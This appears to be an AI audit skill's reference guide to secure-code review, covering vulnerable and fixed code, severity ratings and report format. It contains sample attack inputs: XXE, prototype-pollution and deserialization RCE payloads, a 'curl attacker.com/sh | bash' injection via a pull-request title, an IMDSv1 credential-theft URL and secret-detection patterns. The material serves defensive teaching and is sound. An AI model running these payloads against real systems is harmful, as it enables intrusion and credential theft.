# Security Audit — Methodology & Reference Guide

This file is loaded by `SKILL.md` before any audit begins. It defines the complete
vulnerability taxonomy, severity criteria, output format, and remediation playbooks.

---

## Phase 1 — Git History Analysis

**Goal**: Find secrets or sensitive data ever committed, even if later "deleted".
Deleted lines still exist in git history and are trivially recoverable.

### What to look for

| Category | Patterns |
|---|---|
| API keys | `sk-`, `AKIA`, `ghp_`, `ghs_`, `xoxb-`, `xoxp-`, `AIza`, `SG.` |
| Private keys | `-----BEGIN RSA PRIVATE KEY-----`, `-----BEGIN EC PRIVATE KEY-----`, `-----BEGIN OPENSSH PRIVATE KEY-----` |
| Passwords | `password=`, `passwd=`, `pwd=` followed by a non-placeholder value |
| Tokens | `token`, `bearer`, `jwt`, `access_token` with an actual value |
| DB connection strings | `postgres://`, `mysql://`, `mongodb+srv://` with credentials embedded |
| Sensitive files | `.env`, `id_rsa`, `*.pem`, `*.p12`, `*.jks`, `*.pfx`, `secrets.yaml`, `*.kubeconfig`, `.htpasswd` |

### Reporting format for history findings
- Commit hash (full SHA)
- Author and date
- File path + line number in that commit
- Whether the secret is still present at HEAD or only in history
- Severity: always **Critical** if the secret could still be valid

### Secret Purge Playbook (run AFTER rotating the credential)
```bash
# Option A — git filter-repo (recommended, replaces BFG)
pip install git-filter-repo
git filter-repo --path path/to/secret/file --invert-paths
git push origin --force --all
git push origin --force --tags

# Option B — BFG Repo Cleaner
java -jar bfg.jar --delete-files id_rsa
git reflog expire --expire=now --all && git gc --prune=now --aggressive
git push origin --force --all

# IMPORTANT: notify all collaborators to re-clone.
# Cached forks, CI/CD caches, and package registry mirrors may still hold the secret.
# If published to PyPI/npm/Docker Hub — assume the secret is permanently compromised.
```

> **Rule**: Always rotate the credential FIRST, then purge history.
> Purging history does not invalidate a leaked key — rotation does.

---

## Phase 2 — Static Code Analysis

### 2.1 Injection

#### SQL Injection (CWE-89)
**Vulnerable patterns**:
```python
query = "SELECT * FROM users WHERE id = " + user_id
cursor.execute(query)
```
```javascript
db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`)
```
**Fix**: parameterized queries / prepared statements
```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

#### Command Injection (CWE-78)
**Vulnerable patterns**:
```python
os.system("ping " + user_input)
subprocess.call(cmd, shell=True)
```
**Fix**:
```python
subprocess.run(["ping", "-c", "1", user_input], shell=False)
```

#### XSS — Cross-Site Scripting (CWE-79)
**Vulnerable patterns**:
```javascript
element.innerHTML = userInput
res.send(`<p>${req.query.name}</p>`)
```
**Fix**:
```javascript
element.textContent = userInput
import { escape } from 'html-escaper'
res.send(`<p>${escape(req.query.name)}</p>`)
```

#### SSTI — Server-Side Template Injection (CWE-94)
**Vulnerable patterns**:
```python
template = Template(user_input)
render_template_string(request.args.get('t'))
```
**Fix**: never render user-controlled strings as templates; use a sandboxed environment with a safe allowlist.

#### SSRF — Server-Side Request Forgery (CWE-918)
**Vulnerable patterns**:
```javascript
const url = req.query.url
fetch(url)
```

**DNS Rebinding SSRF** — the most dangerous SSRF bypass, missed by most scanners:
An attacker provides a domain they control. The server resolves it to a legitimate public IP, passes the allowlist check, then the attacker changes the DNS record to point to `169.254.169.254` (AWS metadata) or `127.0.0.1` and the request goes through on retry.

**Fix**:
```javascript
const dns = require('dns').promises
const net = require('net')

const BLOCKED_RANGES = [
  /^127\./, /^10\./, /^192\.168\./, /^172\.(1[6-9]|2[0-9]|3[01])\./,
  /^169\.254\./, /^::1$/, /^fc/, /^fd/
]

async function safeFetch(url) {
  const { hostname } = new URL(url)
  if (net.isIP(hostname)) {
    if (BLOCKED_RANGES.some(r => r.test(hostname)))
      throw new Error('Blocked IP range')
  } else {
    const { address } = await dns.lookup(hostname)
    if (BLOCKED_RANGES.some(r => r.test(address)))
      throw new Error('Blocked IP range (post-DNS)')
    // Re-use the resolved IP to prevent rebinding — do NOT re-resolve
    url = url.replace(hostname, address)
  }
  return fetch(url, { redirect: 'error' })  // never follow redirects blindly
}
```

#### GraphQL Injection (CWE-89 variant)
**Vulnerable patterns**:
```javascript
// User input interpolated into a query string
const query = `{ user(name: "${req.body.name}") { id email } }`
graphql(schema, query)

// Introspection enabled in production — exposes full schema to attackers
// No depth/complexity limits — enables DoS via deeply nested queries
```
**Fix**:
```javascript
// Use variables — never interpolate user input into query strings
const query = `query GetUser($name: String!) { user(name: $name) { id email } }`
graphql(schema, query, null, null, { name: req.body.name })

// Disable introspection in production
import { NoIntrospection } from 'graphql-disable-introspection'
// Enforce query depth and complexity limits
import depthLimit from 'graphql-depth-limit'
import { createComplexityLimitRule } from 'graphql-validation-complexity'
```

#### XXE — XML External Entity Injection (CWE-611)
**Vulnerable patterns**:
```java
// Java — default DocumentBuilderFactory resolves external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()
DocumentBuilder db = dbf.newDocumentBuilder()
Document doc = db.parse(userInputStream)  // XXE: attacker injects <!ENTITY xxe SYSTEM "file:///etc/passwd">
```
```python
# Python — lxml and stdlib ET are safe by default, but explicitly passing resolve_entities=True is not
from lxml import etree
parser = etree.XMLParser(resolve_entities=True)   # VULNERABLE
tree = etree.parse(user_file, parser)
```
**Proof of Concept**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```
**Fix**:
```java
// Java — disable DOCTYPE and external entity resolution
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
dbf.setXIncludeAware(false)
dbf.setExpandEntityReferences(false)
```
```python
# Python — use defusedxml
import defusedxml.ElementTree as ET
tree = ET.parse(user_file)   # safe by default
```

#### HTTP Request Smuggling (CWE-444)
**Vulnerable setup**: A front-end proxy (nginx, CDN) and back-end server disagree on where one HTTP request ends and the next begins, allowing an attacker to prepend a prefix to another user's request.

**Common variants**:
- **CL.TE**: Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`
- **TE.CL**: Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`
- **TE.TE**: Both support TE but attacker obfuscates the header (`Transfer-Encoding: xchunked`)

**Detection signals** in code:
```bash
# Any manual parsing of Content-Length or Transfer-Encoding headers
grep -rn -E "(Content-Length|Transfer-Encoding|chunked)" $AUDIT_SCOPE 2>/dev/null \
  | grep -vi test | grep -vi comment

# Proxy config forwarding raw headers without normalization
grep -rn "proxy_pass\|ProxyPass\|upstream" . 2>/dev/null | head -20
```

**Fix**:
- Ensure front-end and back-end use the same HTTP version (prefer HTTP/2 end-to-end)
- Configure the front-end to reject or normalize ambiguous requests
- Use `--http1.1` explicitly and enforce `Content-Length` XOR `Transfer-Encoding`, never both
- In nginx: set `proxy_http_version 1.1` and `proxy_request_buffering on`
- Periodically test with [smuggler.py](https://github.com/defparam/smuggler) or Burp Suite's HTTP Request Smuggler extension

---

### 2.2 Authentication & Authorization

#### Missing Auth Middleware (CWE-306)
```javascript
// Vulnerable
app.get('/admin/users', (req, res) => { ... })

// Fix
app.get('/admin/users', requireAuth, requireRole('admin'), (req, res) => { ... })
```

#### IDOR — Insecure Direct Object Reference (CWE-639)
```javascript
// Vulnerable
const order = await Order.findById(req.params.id)  // no ownership check

// Fix
const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })
if (!order) return res.status(404).json({ error: 'Not found' })
```

#### JWT Issues (CWE-347)
```javascript
// Vulnerable — accepts 'none' algorithm
jwt.verify(token, secret)

// Fix
jwt.verify(token, secret, { algorithms: ['HS256'] })
```
Also check: weak secrets (< 256 bits), no `exp` claim, tokens stored in localStorage.

#### OAuth Misconfigurations (CWE-601, CWE-352)

**What to look for**:
- `response_type=token` (implicit flow) — exposes tokens in URL, logged by proxies
- Missing or unvalidated `state` parameter — enables CSRF on the authorization endpoint
- `redirect_uri` not strictly validated — enables token theft via open redirects
- `client_secret` present in frontend or mobile code

```javascript
// Fix — authorization code + PKCE, hardcoded redirect, state validation
const state = crypto.randomBytes(16).toString('hex')
req.session.oauthState = state

const authUrl = new URL('https://provider.com/oauth/authorize')
authUrl.searchParams.set('response_type', 'code')
authUrl.searchParams.set('redirect_uri', 'https://yourapp.com/callback')  // hardcoded
authUrl.searchParams.set('state', state)
authUrl.searchParams.set('code_challenge', pkceChallenge)
authUrl.searchParams.set('code_challenge_method', 'S256')

// In callback:
if (req.query.state !== req.session.oauthState) return res.status(400).send('CSRF detected')
```

---

### 2.3 Cryptography

| Issue | Bad | Good |
|---|---|---|
| Hashing passwords | MD5, SHA1 | bcrypt, Argon2, scrypt |
| General hashing | MD5, SHA1 | SHA-256, SHA-3 |
| Symmetric encryption | DES, 3DES, RC4 | AES-256-GCM |
| Hardcoded IV | `iv = b'\x00' * 16` | `os.urandom(16)` |
| Key storage | Plaintext in code | Secrets manager (Vault, AWS SSM) |

```python
# Vulnerable
hashlib.md5(password.encode()).hexdigest()

# Fix
import bcrypt
bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

---

### 2.4 Sensitive Data Exposure (CWE-312, CWE-532)

- Passwords, tokens, or PII written to logs
- `console.log(req.body)` or `print(request.form)` in auth routes
- Stack traces returned to the client in production
- Admin routes without rate limiting or auth
- Debug flags enabled: `DEBUG=True`, `NODE_ENV=development` in prod config

---

### 2.5 Dependencies & Supply Chain (CWE-1395)

**Signals of risk**:
- Unpinned versions (`"express": "*"` or `"^4.0.0"` without a lockfile)
- `postinstall` / `preinstall` scripts in a dependency's `package.json`
- Very low download count + high permission scope
- Dependencies not updated in > 1 year
- Packages with typosquatting names (e.g., `lodahs`, `reqests`)

**Tooling**: see `SKILL.md` Phase 3 for scanner commands.

---

### 2.6 Infrastructure & Configuration

#### CORS (CWE-942)
```javascript
// Vulnerable
app.use(cors({ origin: '*', credentials: true }))

// Fix
app.use(cors({ origin: 'https://yourdomain.com', credentials: true }))
```

#### Missing Security Headers
```javascript
import helmet from 'helmet'
app.use(helmet())
// Covers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, etc.
```

#### Insecure File Upload (CWE-434)
```javascript
// Vulnerable
req.files.file.mv('/uploads/' + req.files.file.name)

// Fix
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'application/pdf']
if (!ALLOWED_TYPES.includes(file.mimetype)) return res.status(400).send('Invalid type')
const safeName = crypto.randomUUID() + path.extname(file.name)
file.mv(path.join('/uploads', safeName))
```

#### Path Traversal (CWE-22)
```python
# Vulnerable
open(os.path.join('/var/data', filename))  # ../../../../etc/passwd

# Fix
base = '/var/data'
safe = os.path.realpath(os.path.join(base, filename))
if not safe.startswith(base):
    abort(400)
```

---

### 2.7 Prototype Pollution (CWE-1321) — JavaScript / TypeScript

**Vulnerable patterns**:
```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key])  // no key sanitization
    } else {
      target[key] = source[key]        // attacker sets __proto__.isAdmin = true
    }
  }
}
merge({}, JSON.parse(req.body))  // body: {"__proto__": {"isAdmin": true}}
```

**Proof of Concept**:
```javascript
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}')
merge({}, payload)
console.log({}.isAdmin)  // true — all objects in the process are now admins
```

**Fix**:
```javascript
// Option A — sanitize keys
function safeMerge(target, source) {
  for (let key of Object.keys(source)) {
    if (['__proto__', 'constructor', 'prototype'].includes(key)) continue
    target[key] = (typeof source[key] === 'object')
      ? safeMerge(target[key] ?? {}, source[key])
      : source[key]
  }
  return target
}

// Option B — prototype-free base object
const safe = Object.assign(Object.create(null), untrustedData)

// Option C — use a patched library: lodash >= 4.17.21
```

Also audit: `lodash.merge`, `jquery.extend`, `qs` with `allowDots`, hand-rolled merge utilities.

---

### 2.8 Insecure Deserialization (CWE-502)

**Vulnerable patterns**:
```python
import pickle
data = pickle.loads(request.data)   # arbitrary code execution

import yaml
config = yaml.load(user_input)      # equivalent to eval()
```
```java
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // gadget chains: Commons Collections, Spring, etc.
```
```javascript
// node-serialize CVE-2017-5941
const obj = serialize.unserialize(req.body.data)
// payload: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

**Fix**:
```python
import json
data = json.loads(request.data)   # use JSON instead of pickle

config = yaml.safe_load(user_input)   # yaml safe loader
```
```java
// Java — deserialization filter (JEP 290, Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.*;java.util.*;!*"  // allowlist only known-safe classes
);
ois.setObjectInputFilter(filter);
// Preferred: migrate to Jackson (JSON) or Protocol Buffers
```

---

### 2.9 Race Conditions & TOCTOU (CWE-367, CWE-362)

**Vulnerable patterns**:
```python
# TOCTOU on file
if os.path.exists(filename):        # check
    with open(filename, 'r') as f:  # use — attacker swaps symlink between these two lines
        content = f.read()

# Race condition on balance — two concurrent requests both pass the check
balance = db.get('balance', user_id)
if balance >= amount:
    db.set('balance', user_id, balance - amount)
    process_payment(amount)
```

**Fix**:
```python
# File: open directly, handle the exception
try:
    with open(filename, 'r') as f:
        content = f.read()
except FileNotFoundError:
    handle_missing()

# Database: atomic operation with conditional update
cursor.execute("""
    UPDATE accounts SET balance = balance - %s
    WHERE user_id = %s AND balance >= %s
    RETURNING balance
""", (amount, user_id, amount))
if not cursor.fetchone():
    raise InsufficientFundsError()

# Redis: Lua script (atomic) or WATCH + MULTI/EXEC
```

---

### 2.10 Business Logic & Other

- **Mass Assignment (CWE-915)**: binding all request fields to a model without allowlisting
  ```javascript
  // Vulnerable
  User.update(req.body)           // attacker sends { role: 'admin' }
  // Fix
  const { name, email } = req.body
  User.update({ name, email })
  ```
- **Unvalidated Redirects (CWE-601)**: `res.redirect(req.query.next)` — validate against an allowlist
- **Clickjacking**: missing `X-Frame-Options` or `frame-ancestors` CSP directive
- **Insecure Randomness (CWE-338)**: `Math.random()` for tokens or IDs — use `crypto.randomBytes()`

---

### 2.11 Container Security

#### Dockerfile best practices

| Issue | Vulnerable | Fix |
|---|---|---|
| Running as root | `USER root` or no USER directive | `USER appuser` (non-root, non-zero UID) |
| Pinning base image | `FROM node:latest` | `FROM node:20.15.0-alpine3.20` |
| Secrets in build args | `ARG API_KEY` then `ENV API_KEY=$API_KEY` | Inject at runtime via env vars or secrets manager |
| Curl pipe to shell | `RUN curl https://... \| sh` | Download, verify checksum, then execute |
| ADD with remote URL | `ADD https://...` | `COPY` local verified artifact instead |
| Unnecessary packages | `RUN apt install -y curl vim wget` | Install only what the app needs |

```dockerfile
# Vulnerable
FROM node:latest
USER root
ARG DB_PASSWORD
ENV DB_PASSWORD=$DB_PASSWORD
RUN curl https://example.com/install.sh | sh

# Fix — multi-stage build, non-root user, pinned base
FROM node:20.15.0-alpine3.20 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev

FROM node:20.15.0-alpine3.20
WORKDIR /app
COPY --from=builder /app .
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
EXPOSE 3000
CMD ["node", "server.js"]
```

#### Image vulnerability scanning
Use `trivy` or `grype` (see SKILL.md Phase 4) to detect CVEs in base image packages.
Report any HIGH/CRITICAL CVEs with a fix version available.

---

### 2.12 Cloud & IaC Misconfiguration

#### Common Terraform misconfigurations

```hcl
# Vulnerable — public S3 bucket
resource "aws_s3_bucket" "data" {
  acl = "public-read"           # exposes all objects to the internet
}

# Vulnerable — unencrypted RDS
resource "aws_db_instance" "main" {
  storage_encrypted = false
  publicly_accessible = true
}

# Vulnerable — overly permissive security group
resource "aws_security_group_rule" "ssh" {
  cidr_blocks = ["0.0.0.0/0"]
  from_port   = 22
}
```

```hcl
# Fix
resource "aws_s3_bucket" "data" {
  # no ACL — default private
}
resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_db_instance" "main" {
  storage_encrypted   = true
  publicly_accessible = false
  deletion_protection = true
}

resource "aws_security_group_rule" "ssh" {
  cidr_blocks = ["10.0.0.0/8"]   # internal only
  from_port   = 22
}
```

#### IMDSv1 — SSRF to IAM credential theft
Any application with an SSRF vulnerability running on EC2 can hit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and steal the instance role credentials if IMDSv1 is enabled.

**Fix**: Enforce IMDSv2 (token-required mode):
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required \
  --http-endpoint enabled
```

#### GitHub Actions script injection
```yaml
# Vulnerable — attacker creates PR with title: `"; curl attacker.com/sh | bash; #`
- name: Process PR
  run: echo "PR title: ${{ github.event.pull_request.title }}"

# Fix — use an environment variable, never interpolate directly into run:
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

---

### 2.13 License Compliance

License violations are a legal risk, not a security vulnerability, but they must be reported.

| License Type | Risk | Action |
|---|---|---|
| MIT, Apache 2.0, BSD | Low | Notice + attribution required |
| LGPL | Medium | Dynamic linking usually safe; static linking may require source disclosure |
| GPL v2/v3 | High | Using in proprietary software may require source disclosure of entire work |
| AGPL | Critical | Network use triggers copyleft — open source all server-side code or obtain commercial license |
| SSPL | Critical | Same as AGPL — used by MongoDB, Elasticsearch |
| Unlicensed | Unknown | No rights granted — contact author or avoid |

Flag any AGPL/GPL/SSPL dependency used in a proprietary or SaaS product and escalate to legal review.

---

## Phase 3 — Risk Classification

### Severity Matrix

| Severity | CVSS Range | Examples |
|---|---|---|
| Critical | 9.0–10.0 | RCE, auth bypass, exposed secret with access, XXE reading `/etc/passwd`, public S3 bucket with PII, IMDSv1 + SSRF |
| High | 7.0–8.9 | SQLi, SSRF, privilege escalation, broken JWT, prototype pollution leading to auth bypass, HTTP request smuggling, container running as root with host network |
| Medium | 4.0–6.9 | XSS, IDOR, sensitive data in logs, CORS misconfiguration, OAuth implicit flow, unencrypted RDS, IMDSv2 not enforced |
| Low | 0.1–3.9 | Missing header, verbose errors, outdated dep (no PoC), pinned to `:latest` Docker tag |
| Info | N/A | Best practice deviations, security debt markers, license compliance issues |

Every finding **must** include:
- Severity + CVSS score
- CWE ID (or "N/A — IaC/License issue")
- Exact location (file:line, commit SHA, or AWS resource ID)
- Description explaining the risk
- Proof of Concept (minimal exploit, reproduction steps, or misconfiguration evidence)
- Fix with corrected code / config snippet

---

## Phase 4 — Remediation Roadmap

1. **Rotate all exposed secrets immediately** (before purging history)
2. **Fix Critical issues** — patch and deploy within 24h
3. **Fix High issues** — patch within the sprint
4. **Purge git history** for any committed secrets (see Phase 1 playbook)
5. **Fix Medium issues** — schedule in backlog
6. **Update vulnerable dependencies** — run audit tooling, apply patches
7. **Remediate container/cloud misconfigs** — apply IaC fixes, redeploy
8. **Low / Info** — address during normal refactoring
9. **Resolve license violations** — escalate AGPL/GPL findings to legal before next release
10. **Tooling gaps** — install any missing scanners flagged during the audit

---

## Security Hardening Recommendations

### Pre-commit hooks
```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.4
    hooks:
      - id: gitleaks
  - repo: https://github.com/hadolint/hadolint
    rev: v2.12.0
    hooks:
      - id: hadolint-docker
```

### CI/CD integration
```yaml
- name: Run Semgrep
  uses: semgrep/semgrep-action@v1
  with:
    config: p/owasp-top-ten p/secrets p/javascript p/python p/golang p/kotlin

- name: Run Gitleaks
  uses: gitleaks/gitleaks-action@v2

- name: npm audit
  run: npm audit --audit-level=high

- name: pip-audit
  run: pip install pip-audit && pip-audit

- name: Trivy image scan
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: ${{ env.IMAGE_TAG }}
    severity: HIGH,CRITICAL
    exit-code: 1

- name: Checkov IaC scan
  uses: bridgecrewio/checkov-action@master
  with:
    directory: .
    framework: terraform,kubernetes,dockerfile
```

### Recommended SAST tools by language

| Language | Tools |
|---|---|
| JavaScript/TypeScript | Semgrep, ESLint security plugins, NodeJsScan |
| Python | Bandit, Semgrep, pip-audit |
| Go | Gosec, govulncheck |
| Java | SpotBugs + Find-Sec-Bugs, Semgrep |
| Ruby | Brakeman |
| Rust | cargo-audit, cargo-geiger |
| C / C++ | flawfinder, cppcheck, clang-tidy |
| Kotlin | detekt |
| Swift | swiftlint |
| PHP | psalm (taint analysis), phpstan |
| Any | Semgrep (rules: p/owasp-top-ten, p/secrets) |

### Secrets management
- Never hardcode secrets — inject at runtime via environment variables
- Use a secrets manager: HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager
- Rotate secrets regularly and on every team member departure
- Prefer short-lived tokens (OIDC, IAM roles)

### DAST (out of scope for this skill)
Dynamic Application Security Testing requires a running instance and is **not performed by this skill**.
Recommended tools for runtime testing: **OWASP ZAP** (free), **Burp Suite Pro**, **Nuclei**.
Run DAST in a staging environment as part of your release pipeline.

---

## Output Format (mandatory)

```
## CRITICAL FINDINGS (if any)
[List critical findings immediately at the top]

---

## Executive Summary
Total findings: X Critical, Y High, Z Medium, W Low, V Informational
Most critical issues: [short list]
DAST Note: Dynamic/runtime testing was not performed — recommend OWASP ZAP or Burp Suite.

---

## Finding #1 — [Short Title]
- **Severity**: Critical | CVSS 9.8
- **CWE**: CWE-89 (SQL Injection)
- **Location**: `src/db/queries.js:47` or commit `a3f9c2d` or AWS resource `i-0abc123`
- **Status**: Confirmed (Semgrep) | Unconfirmed (grep only — manual review needed)
- **Description**: [What it is and why it is dangerous]
- **Proof of Concept**:
  [Minimal reproduction — curl command, payload, step-by-step, or misconfiguration evidence]
- **Fix**:
  [Corrected code / configuration snippet]

---

## Remediation Roadmap
[Numbered, prioritized action list]

## Security Hardening Recommendations
[Tooling and process suggestions specific to this project's stack]

## License Compliance Issues
[Any AGPL/GPL/SSPL findings with legal escalation note]

## Tooling Gaps
[Every [WARN] emitted during the audit, with install instructions]
```
